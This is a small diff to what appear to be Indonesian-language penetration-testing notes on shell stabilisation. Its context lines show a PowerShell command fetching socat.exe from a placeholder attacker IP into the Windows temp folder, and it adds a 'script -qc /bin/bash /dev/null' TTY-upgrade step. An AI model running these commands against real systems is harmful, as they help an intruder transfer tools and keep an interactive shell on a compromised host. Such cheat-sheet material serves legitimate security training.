@@ -21,6 +21,8 @@
    untuk windows bisa gunakan
    `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`
 
+# pakai bash
+1. script -qc /bin/bash /dev/null
 
 # Addition
 edit tty terminal size dengan
